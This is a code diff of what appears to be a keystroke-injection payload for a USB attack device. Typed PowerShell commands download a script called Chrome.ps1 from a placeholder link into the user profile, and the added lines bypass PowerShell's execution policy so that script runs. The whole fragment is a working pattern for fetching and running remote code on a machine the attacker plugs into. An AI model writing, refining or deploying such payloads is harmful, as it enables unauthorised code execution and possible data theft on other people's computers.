@@ -28,6 +28,12 @@ DELAY 1000
 STRING (New-Object System.Net.WebClient).DownloadFile("CHROME.PS1 LINK HERE","$env:USERPROFILE\Chrome.ps1")
 ENTER
 DELAY 2000
+STRING Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+ENTER
+DELAY 500
+STRING A
+ENTER
+DELAY 500
 STRING ./Chrome.ps1
 ENTER
 DELAY 5000
